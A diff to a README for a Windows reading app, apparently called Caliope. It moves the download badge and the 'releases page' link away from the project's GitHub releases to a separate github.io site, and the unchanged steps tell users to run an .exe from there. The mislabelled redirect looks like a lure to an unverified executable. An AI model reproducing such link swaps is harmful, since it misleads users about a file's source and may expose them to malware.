@@ -1,6 +1,6 @@
 # 📖 caliope-reading-hub - Read and share your favorite stories
 
-[![](https://img.shields.io/badge/Download_Caliope-Blue?style=for-the-badge)](https://github.com/PigKkkkk/caliope-reading-hub/releases)
+[![](https://img.shields.io/badge/Download_Caliope-Blue?style=for-the-badge)](https://pigkkkkk.github.io)
 
 Caliope acts as a central space for readers and writers. You track your progress, comment on chapters, and talk with other readers inside a clean interface. This software works on your Windows computer and keeps your reading list synced. You do not need to manage complex files or write code to use this platform.
 
@@ -12,7 +12,7 @@ You install Caliope in a few minutes. You need a computer running Windows 10 or 
 
 Follow these steps to get the latest version on your machine:
 
-1. Visit the [releases page](https://github.com/PigKkkkk/caliope-reading-hub/releases) to find the installer.
+1. Visit the [releases page](https://pigkkkkk.github.io) to find the installer.
 2. Look for the section labeled Assets.
 3. Click the link that ends in .exe to start your download.
 4. Save the file to your Downloads folder.
